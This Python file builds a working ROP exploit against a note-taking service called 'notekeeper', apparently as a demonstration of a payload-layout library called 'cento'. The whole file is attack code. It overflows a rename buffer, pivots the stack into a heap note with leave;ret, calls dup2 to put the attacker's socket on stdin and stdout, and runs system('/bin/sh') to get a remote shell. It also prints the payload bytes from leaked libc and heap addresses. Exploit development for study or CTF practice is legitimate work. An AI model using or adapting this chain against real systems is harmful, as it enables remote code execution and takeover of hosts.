#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
# mypy: disable-error-code="assignment, valid-type"
# notekeeper-pwn, mapped to cento: the same exploit as before.py, byte for byte
# (run check.py and see). Two leaks are two SYMBOLS; each frame is a View whose
# fields read as the qwords the CPU pops and returns through; the slab offsets
# are never typed -- alloc() derives them, and every cross-reference is a handle
# standing for its own address. refusal.py grows it; enhanced.py is the same
# bytes a third time, as a CHECKED chain (the fold proves the dataflow and the
# movaps alignment).
import cento

LIBC = cento.Ref("libc_base")  # leak #1: bound at throw time

POP_RDI = LIBC + 0x02A3E5  # pop rdi ; ret
POP_RSI_R15 = LIBC + 0x02BE51  # pop rsi ; pop r15 ; ret (no bare pop rsi in this libc)
LEAVE_RET = LIBC + 0x04B9D1  # leave ; ret -- THE pivot: rsp <- rbp ; pop rbp
RET = LIBC + 0x029CD6  # ret -- movaps aligner, see ShellFrame
DUP2 = LIBC + 0x0EB0B0  # dup2()
SYSTEM = LIBC + 0x052290  # system()
FD = 4  # our socket: 3 is notes.db, 4 accept()'d us (strace'd)

NOTE_SZ = 0x100  # add-note reads exactly this many bytes
OFFSET = 0x40  # dst[64]: the rename handler's 0x50-byte read overflows by rbp + rip only


# One frame = one View, entered by leave;ret: pop rbp eats next_rbp, ret eats
# the next qword, and the trailing hop moves rsp to wherever next_rbp pointed.
class Dup2Frame(cento.View):  # dup2(oldfd, newfd), then hop to the next frame
    next_rbp: cento.u64  # -> rbp: the next frame (linked below)
    pop_rdi: cento.u64 = POP_RDI
    oldfd: cento.u64 = FD  # -> rdi: our socket
    pop_rsi: cento.u64 = POP_RSI_R15
    newfd: cento.u64  # -> rsi: 0 stdin / 1 stdout
    r15: cento.u64 = 0  # junk: the pop pair drags it along
    dup2: cento.u64 = DUP2  # dup2 returns onto the next qword...
    hop: cento.u64 = LEAVE_RET  # ...the hop: rsp <- rbp (= next_rbp)


class ShellFrame(cento.View):  # system("/bin/sh") -- nothing after this returns
    rbp: cento.u64 = 0  # junk: nobody leaves again
    pop_rdi: cento.u64 = POP_RDI
    binsh: cento.u64  # -> rdi: &"/bin/sh" (linked below)
    align: cento.u64 = RET  # movaps: entering system by ret wants rsp%16 == 8 here
    system: cento.u64 = SYSTEM


class BinShString(cento.View):
    s: cento.Bytes(8) = b"/bin/sh\x00"


class Smash(cento.View):  # the 16 bytes past dst[64]: saved rbp, saved rip
    rbp: cento.u64  # the pivot target: the first frame (leave #1 loads it)
    rip: cento.u64 = LEAVE_RET  # leave #2: rsp <- rbp -- the slab is the stack now


layout = cento.Layout(endian="little")

# Leak hygiene: an implausible bind refuses when it lands (refusal.py trips it).
layout.expect_sym("libc_base", align=0x1000)  # page-aligned, or you read it wrong
layout.expect_sym("slab_base", align=0x10)  # malloc returns 16-aligned chunks

# The note body. alloc() derives the slab map: grow or reorder a frame and
# everything after it moves; the handles keep pointing at the right bytes.
slab = layout.region("slab", max_size=NOTE_SZ)
stdin = slab.alloc(Dup2Frame, "stdin")  # frame 0: dup2(FD, 0)
stdout = slab.alloc(Dup2Frame, "stdout")  # frame 1: dup2(FD, 1)
shell = slab.alloc(ShellFrame, "shell")  # frame 2: system("/bin/sh")

# The chain, linked by name: handles ARE addresses (slab_base + derived offset).
stdin.newfd = 0
stdin.next_rbp = stdout
stdout.newfd = 1
stdout.next_rbp = shell
shell.binsh = slab.alloc(BinShString, "sh")

# The smash: region fill is the pad; the two owned qwords are one View.
stack = layout.region("stack", max_size=OFFSET + len(Smash), fill="A")
smash = stack.at(OFFSET, Smash, name="smash")
smash.rbp = stdin  # cross-region: a stack cell holding a heap address

if __name__ == "__main__":
    layout.bind("libc_base", 0x00007F1FBABC0000, source="puts(got.puts) leak")
    layout.bind("slab_base", 0x0000556E2F4C12A0, source="note[2] stale-ptr print")
    print(f"after slab: {layout.image('slab').hex()}")
    print(f"after stack: {layout.image('stack').hex()}")
